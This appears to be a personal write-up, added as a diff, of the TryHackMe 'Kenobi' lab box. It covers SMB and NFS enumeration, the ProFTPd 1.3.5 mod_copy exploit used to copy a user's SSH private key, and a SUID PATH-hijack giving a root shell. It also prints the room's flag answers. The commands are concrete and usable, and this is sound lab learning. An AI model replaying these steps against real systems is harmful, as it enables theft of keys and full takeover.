@@ -1,0 +1,86 @@
+
+
+Kenobi
+=======
+
+IP: 10.10.172.10
+
+Scanning
+---------
+
+Nmap:
+	21 ftp proftpd 1.3.5
+	22 ssh openssh 7.2p2
+	80 http apache/2.4.18
+	111 rpcbind 
+	139 smb smb3.x - 4.x
+	445 smb smb 4.3.11	
+	2049 nfs_acl (mounted file system)
+
+	/robots.txt
+		- /admin.html (It's a trap)
+
+
+Gaining Access
+----------------
+
+- Scanning smb for further enumeration
+
+	- enum4linux 10.10.172.10 | tee e4l_scan (tee command helps you to view the output as well as store it to a file)
+	- Connected to the host using smbclient
+		smbclient \\10.10.172.10\anonymous
+	- Downloaded the files in the directory using smbget
+		smbget -R smb://10.10.172.10/anonymous
+	- From the file on the share... 'log.txt'
+		- Found that ftp server is running by the privileges of user kenobi.
+
+- We have a nfs service runnning (which means we can mount shared file systems)
+	- Found a nfs: /var 
+		showmount -e 10.10.172.10
+	- Mounted the file system using:
+		sudo mount -t nfs 10.10.172.10:/var /mnt/
+
+- On searchsploit found the following exploits for proftpd 1.3.5:
+	- ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)
+	- ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
+	- ProFTPd 1.3.5 - File Copy
+
+	- After reading the 3rd one, I found that SITE CPFR and SITE CPTO can allow unauthenticated user to copy files from the server to another directory
+	- Logging in via netcat (nc 10.10.172.10 21) and executing the following command got me the private key of user kenobi(as the ftp service was running by user kenobi, I was able to download it)
+	- SITE CPFR /home/kenobi/.ssh/id_rsa
+	- SITE CPTO /var/tmp/
+Note: Remember we got access the /var share and mounted earlier on /mnt/ (the nfs service that was running).
+
+From there I copied the file to my cwd(current working directory):
+	cat /mnt/tmp/id_rsa | tee /home/pjrox/tryhackme/kenobi/id_rsa
+
+	- Logged in via ssh -i id_rsa kenobi@10.10.172.10
+
+User Flag: d0b0f3f53b6caa532a83915e19224899
+
+Privilege Escalation
+----------------------
+
+Found a wierd file with suid privs
+	- /usr/bin/menu
+	- When I ran it, it gave me a help menu... When I use strings on that binary I saw that the binary is running commands with full paths... bingo...
+	I privescalated using PATH variable exploitation... I set PATH variable to home dir and ran a custom command through it.
+
+		echo "/bin/bash" > ifconfig && chmod +x ifconfig
+		export PATH=/home/kenobi:$PATH
+
+	- So when I ran that binary again with 3rd option it gave me a root shell... and I cat-out the flag... 
+
+Root Flag: 177b3cd8562289f37382721c28381f02
+
+EXTRA NOTES
+-------------
+
+- RPCbind is a server that converts RPC(Remote Procedure Call) number into universal addresses. 
+	- By my observation, I think it is a log book which keeps record of what other services are running on the box and how are they communicating with the other systems/internet... Or basically, small services that run and rpcbind converts their process IDs (the process they are running on hosts) to universal numbers (Ports)
+
+Note: the box has enumerated the nfs shares using nmap... I enumerated using showmount -e 10.10.172.10 and mounted the file system 
+
+	sudo mount -t nfs 10.10.172.10:/var /mnt/
+
+This was it for the room.
